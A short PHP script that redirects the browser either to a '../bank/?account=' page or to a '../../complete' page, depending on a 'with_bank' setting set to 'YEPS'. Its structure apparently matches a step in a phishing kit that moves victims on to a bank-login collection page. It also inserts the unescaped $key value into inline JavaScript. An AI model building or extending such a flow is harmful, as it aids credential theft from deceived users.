<?
require_once '../../main.php';
if($setting['with_bank'] == "YEPS"){
 echo "<script type='text/javascript'>window.top.location='../bank/?account=$key';</script>";
}else{
echo "<script type='text/javascript'>window.top.location='../../complete';</script>";
}
?>